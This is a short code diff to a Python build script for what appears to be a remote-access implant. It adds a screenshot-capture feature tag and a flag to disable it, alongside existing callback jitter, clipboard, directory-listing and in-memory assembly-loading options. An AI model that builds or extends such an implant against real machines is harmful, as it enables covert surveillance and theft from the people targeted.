@@ -28,6 +28,7 @@ build_tags_list = [
     "drm",
     "dir",
     "clip",
+    "screen",
     "asm"
 ]
 build_tags_cmd = f'-tags "{" ".join(build_tags_list)}"'
@@ -86,12 +87,15 @@ def main():
                         help="time to sleep between callbacks (default: 5)", default="5")
     parser.add_argument("-sj", "--sleep-jitter", metavar="<percent (%)>", 
                         help="sleep time jitter in percent (default: 0)", default="0")
+    
     parser.add_argument("-dd", "--disable-drm", action="store_true",
                         help="disable DRM feature")
     parser.add_argument("-dr", "--disable-dir", action="store_true",
                     help="disable directory view feature (/dir)")
     parser.add_argument("-dc", "--disable-clip", action="store_true",
                         help="disable clipboard feature (/clip)")
+    parser.add_argument("-ds", "--disable-screen", action="store_true",
+                        help="disable screenshot feature (/screen)")
     parser.add_argument("-da", "--disable-asm", action="store_true",
                     help="disable assemblies loading feature (/asm + /iex)")
 
@@ -115,7 +119,9 @@ def main():
     if args.disable_dir:
         compile_cmd = compile_cmd.replace("dir", "") 
     if args.disable_clip:
-        compile_cmd = compile_cmd.replace("clip", "")  
+        compile_cmd = compile_cmd.replace("clip", "") 
+    if args.disable_screen:
+        compile_cmd = compile_cmd.replace("screen", "")   
     if args.disable_asm:
         compile_cmd = compile_cmd.replace("asm", "")
 
